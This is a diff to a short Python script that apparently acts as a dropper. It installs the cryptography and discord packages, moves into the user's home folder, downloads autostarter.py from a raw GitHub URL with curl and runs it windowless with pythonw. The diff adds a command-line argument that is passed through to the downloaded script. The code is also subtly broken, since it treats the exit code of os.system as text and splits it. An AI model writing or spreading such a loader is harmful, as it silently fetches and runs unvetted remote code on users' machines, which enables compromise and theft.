@@ -1,3 +1,9 @@
+import sys
+if len(sys.argv) > 1:
+    argument = sys.argv[1]
+else:
+    sys.exit()
+
 import os
 os.system("pip install cryptography")
 os.system("pip install discord")
@@ -10,4 +16,4 @@ whoami = os.system("whoami")
 whoami_split = whoami.split("\\")
 username = whoami_split[1]
 os.system(f"cd C:\\Users\\{username} && curl -O https://raw.githubusercontent.com/jkramer5103/stuff/refs/heads/main/autostarter.py")
-os.system(f"pythonw autostarter.py")
+os.system(f"pythonw autostarter.py {argument}")
